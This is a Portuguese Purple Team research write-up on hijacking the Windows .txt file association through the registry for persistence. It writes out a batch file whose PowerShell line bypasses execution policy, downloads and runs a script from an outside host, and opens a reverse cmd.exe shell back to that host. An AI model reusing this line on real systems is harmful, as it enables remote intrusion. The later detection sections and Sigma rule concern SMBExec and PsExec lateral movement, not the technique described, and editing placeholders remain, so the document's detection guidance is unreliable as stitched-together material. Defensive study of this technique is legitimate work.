
<p align="center">
  <img src="./imagens/ISHLOGO.png" alt="Logo do Purple Team" width="300" height="300">
</p>

# CTI Purple Team - Execução Acionada por Evento: Alterar Associação de Arquivo Padrão 

Quando um arquivo é criado em um sistema operacional como o Windows, ele é automaticamente associado a um programa específico que será usado para abrir esse tipo de arquivo quando clicado duas vezes.

A execução acionada por evento permite que os usuários personalizem a maneira como os arquivos são abertos, definindo regras específicas para acionar a execução de aplicativos diferentes com base em diferentes eventos.

As seleções de associação de arquivos são armazenados no Registro do Windows e podem ser editados por usuários, administradores ou programas que tenham acesso ao Registro ou por administradores usando o utilitário associado.

Neste contexto, exploraremos os conceitos por trás da execução acionada por evento representando o sequestro da extenção ***.txt***, sendo possível executar um aplicativo malicioso antes que o arquivo real seja aberto, gerando um reverse shell na máquina do atacante.

## Contexto

Quando um arquivo ***.txt*** é clicado duas vezes, ele é aberto com um ***notepad.exe***. O windows por padrão sabe que para abrir esse tipo de extensão precisa usar o *notepad.exe*.

As associaçõs de arquivos do sistemas estão listadas em **HKEY_CLASSES_ROOT.[extention]**, no caso dessa pesquisa será listado em **HKEY_CLASSES_ROOT.txt**.

No entanto, é possível sequestrar chaves de registro que controlam o programa padrão para extensões específicas a fim de obter persistência.


## Análise e Execução do código malicioso

Há dois locais de registro que definem os manipuladores de extensão, que são mostrados a seguir, e são classificados como: *Global* e *Local*.

<p align="center">
  <img src="imagens/locais-de-registro.png">
</p>

Quando um usuário tenta abrir um arquivo, o sistema operacional verifica os registros locais em (HKEY_CURRENT_USERS) para determinar qual programa está designado para lidar com aquela extensão de arquivo. Caso nao houver nenhuma entrada de registro associada, a verificação é feita na árvore de registro global (HKEY_CLASSES_ROOT).

Dependendo dos privilégios do usuário (Administrador ou Usuário Padrão), esses locais de registro podem ser explorados para executar código malicioso, utilizando o manipulador de extensão como um gatilho.

A priori, para executar o sequestro de extensão é necessário que o atacante já possua o primeiro acesso inicial à máquina alvo.

Portanto, podemos observar que o manipulador de extensão ***.txt*** está definido na chave de registro abaixo:

Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command ---- [***colocar botao de copiar***]

Abaixo exemplifico que o comando responsável por abrir arquivos *.txt* é o *notepad.exe %1*, onde o argumento *%1*, especifica um nome de arquivo qualquer, ou seja, é uma variante para o nome dos arquivos que o bloco de notas deve abrir:

<p align="center">
  <img src="imagens/Editor-de-registro-HKEY.png">
</p>

Supomos que o usuário alvo possua uma arquivo chamado ***test.txt*** em sua área de trabalho, contendo o conteúdo do arquivo ilustrado abaixo:

<p align="center">
  <img src="imagens/arquivo-vitima.png">
</p>

Iremos criar agora um arquivo malicioso que será executado quando o usuário alvo tentar abrir um arquivo chamado test.txt, sendo que com a execução desta têcnica pode ser qualquer arquivo aleatório, apenas seguindo o critério de extenção .txt usado como exemplo nesta pesquisa.

Para isso, criaremos um arquivo em lotes simples do Windows chamado ***shell.cmd*** na maquina do usuário alvo:

start notepad.exe %1
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://192.168.140.128/purplecat.ps1');purplecat -c 192.168.140.128 -p 8081 -e cmd.exe"  ------- ***COLOCAR BOTAO DE COLAR***

A partir disso, podemos sequestrar a extensão do arquivo .txt, modificando os dados do valor de registro de: Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command para C:\Users\Win-test\Desktop\shell.cmd, local onde nosso arquivo malicioso está gravado.

<p align="center">
  <img src="imagens/mod.registro.png">
</p>

Após a modificação a chave de registro se encontrará da mesma maneira que a imagem abaixo:

<p align="center">
  <img src="imagens/modificado.png">
</p>

Na seção a seguir, vamos analisar como podemos executar detectar a execução desta ferramenta desenvolvida em *PowerShell*, e validar a reutilização de uma detecção já criada por meio da pesquisa do Purple Team, referente ao **PsExec**.

## Análise de Comportamento




Este, e as demais constantes observadas no código podem ser identificadas por meio do ***Event ID 4104***.

### Reutiização da Regra de Detecção do PsExec e de Criação de Serviços Maliciosos.

Como foi possível observar, se você leu ou assistiu ao [Webinar](https://ishtecnologia.sharepoint.com/:v:/s/CTI-PurpleTeam/EXxP0PKWVJlAuad4KmBTUoAB9P-aQ0ebrhlVtrFO5_ejWg?e=Pu4GpV) da pesquisa de Movimentação Lateral Através do PSExec, você já perecebeu que o fluxo de execução do *SMBExec* é semelhante ao fluxo de execução do PsExec.

Parte deste fluxo é o *logon com o tipo 3* ([**Event ID 4624**](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=4624)) e o acesso a escrita do compartilhamento oculto administrativo **IPC$**. Isso pode ser visto na imagem abaixo.

<p align="center">
  <img src="imagens/14.ipc_write_data.png">
</p>

Ou seja, de fato, é semelhante o suficiente para que a nossa regra de detecção [BASELINE - Lateral Movement - Possible Lateral Movement Through PSExec](https://github.com/ish-cti-purple/CTI-PurpleTeam/blob/main/Regras/Sigma/Lateral_Movement/BASELINE%20-%20Lateral%20Movement%20-%20Possible%20Lateral%20Movement%20Through%20PSExec.yml), possa ser utilizada para detectar o comportamento produzido no dispositivo vítima, ao sofrer a exploração da ferramenta ***SMBExec***.

Também é possível observar outro comportamento, no qual além de dar *match* com a sequência de comportamentos produzidos pelo *PsExec*, também pode ser detectado por outra regra de detecção desenvolvida por meio de uma das pesquisas do *Purple Team*. Esta regra foi um output da pesquisa de [***Criação de Serviços Maliciosos no Windows***](https://github.com/ish-cti-purple/CTI-PurpleTeam/blob/main/Pesquisas/ATT%26CK%20TTPs/%5BTA0003%5D%20Persistence/%5BT1543%5D%20Create%20or%20Modify%20System%20Process/%5BT1543.003%5D%20Create%20or%20Modify%20System%20Process%3A%20Windows%20Service/CTI%20Purple%20Team%20-%20Cria%C3%A7%C3%A3o%20de%20Servi%C3%A7os%20Maliciosos%20no%20Windows/%5BCTI%20Purple%20Team%5D%20Cria%C3%A7%C3%A3o%20de%20Servi%C3%A7os%20Maliciosos%20no%20Windows.md).

Esta pesquisa nos permite compreender como podemos detectar a criação de serviços maliciosos por meio dos Event IDs [**7045**](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) e [**4697**](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697).

<p align="center">
  <img src="imagens/15.malicious_service_creation.png">
</p>

Foi implementado sa regra Sigma de todas as pesquisas citadas, e o resultado foi o match de cada aspecto da execução do ***SMBExec***.

<p align="center">
  <img src="imagens/14.ipc_write_data.png">
</p>

## Engenharia de Detecção

Para detectarmos a execução da ferramenta em PowerShell do SMBExec, nós confeccionamos a regra de detecção abaixo documentada no modelo Sigma.

```yaml
title: 000:1311431:000:TA0008.T1021.002:Possible Lateral Movement Through SMBExec
id: 77fba173-754b-4fdf-9271-3528648139fe
status: stable
description: 'Esta regra detecta o comportamento produzido pela execução do PSExec, para a realização de Movimentação Lateral.'
references:
    - 'https://attack.mitre.org/techniques/T1543/003'
    - 'https://attack.mitre.org/techniques/T1570/'
    - 'https://attack.mitre.org/techniques/T1021/002/'
    - 'https://attack.mitre.org/techniques/T1569/002/'
    - 'https://attack.mitre.org/techniques/T1550/002/'
author: CTI Purple Team
date: 2024/01/05
tags:
    - 'attack.persistence.T1543.003'
    - 'attack.lateral.movement.T1570'
    - 'attack.lateral.movement.T1021.002'
    - 'attack.execution.T1569.002'
    - 'attack.lateral.movement.T1550.002'
logsource:
    category: 'powershell_scriptblock_logging'
    product: 'windows'
detection:
    Message|contains:
        - '0xff,0x53,0x4d,0x42'
        - '0xfe,0x53,0x4d,0x42'
        - '0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00'
        - 'IPC$'
        - 'ADMIN$'
        - 'C$'
    condition: Message
fields:
    - PowerShell Script Block;
    - Computer Name.
falsepositives:
    - 'É necessário identificar realizar triagem de possíveis scripts que possam utilizar-se das mesmas capacidades, e que foram desenvolvidas pelos administradores de sistemas'
level: high
```

# Conclusão

Esperamos que você que leu ou assistiu o Webinar, possa ter compreendido a inteligência que trouxemos nesta pesquisa. Qualquer dúvida, é só nos contactar.

## Link do Webinar

Caso você não pode participar do Webinar de apresentação da pesquisa, ou gostaria rever, basta clicar neste [link](https://ishtecnologia.sharepoint.com/sites/CTI-PurpleTeam/_layouts/15/stream.aspx?id=%2Fsites%2FCTI%2DPurpleTeam%2FDocumentos%20Compartilhados%2FVideos%2FCTI%20Purple%20Team%20%2D%20Movimenta%C3%A7%C3%A3o%20Lateral%20Atrav%C3%A9s%20do%20Invoke%2DSMBExec%2Emp4&referrer=StreamWebApp%2EWeb&referrerScenario=AddressBarCopied%2Eview).
